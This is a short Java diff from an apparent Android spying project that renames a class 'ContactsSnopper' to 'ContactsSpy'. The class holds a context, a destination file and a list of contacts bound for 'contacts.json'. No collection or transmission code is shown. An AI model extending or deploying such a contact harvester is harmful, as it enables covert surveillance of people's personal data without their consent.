@@ -12,14 +12,14 @@ import org.json.JSONObject;
 import com.gameofcoding.spy.utils.XLog;
 import java.io.File;
 
-public class ContactsSnopper implements Spy {
-    private final String TAG = "ContactsSnopper";
+public class ContactsSpy implements Spy {
+    private final String TAG = "ContactsSpy";
     public static final String CONTACTS_FILE_NAME = "contacts.json";
     private Context mContext;
     private File mDestFile;
     private final JSONArray contacts = new JSONArray();
 
-    public ContactsSnopper(Context context, File destFile) {
+    public ContactsSpy(Context context, File destFile) {
 	mContext = context;
 	mDestFile = destFile;
     }
